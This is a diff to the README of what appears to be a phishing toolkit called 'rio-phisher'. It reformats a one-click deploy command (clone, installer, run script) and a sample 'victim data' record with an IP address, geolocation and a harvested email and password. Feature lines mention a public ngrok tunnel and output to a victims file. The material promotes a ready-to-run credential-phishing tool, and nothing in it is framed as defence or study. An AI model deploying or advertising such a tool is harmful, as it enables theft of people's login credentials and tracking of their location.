@@ -4,7 +4,7 @@
 
 ## 🚀 1-Click Deploy
 
-git clone https://github.com/riology/rio-phisher.git cd rio-phisher python installer.py # Auto-fixes ngrok python run.py # LIVE!
+```git clone https://github.com/riology/rio-phisher.git cd rio-phisher python-installer.py python-run.py```
 
 
 
@@ -20,8 +20,8 @@ git clone https://github.com/riology/rio-phisher.git cd rio-phisher python insta
 - 🌐 Public ngrok tunnel
 - 📊 Output: `data/victims.json`
 
-**Sample victim data:**
-{ "ip": "1.2.3.4", "geolocation": {"lat": 40.7128, "lon": -74.0060}, "credentials": {"email": "victim@gmail.com", "password": "P@ssw0rd123"} }
+**Sample victim data:**\
+```{ "ip": "1.2.3.4", "geolocation": {"lat": 40.7128, "lon": -74.0060},``` <br> ```"credentials": {"email": "victim@gmail.com", "password": "P@ssw0rd123"} }```
 
 
 
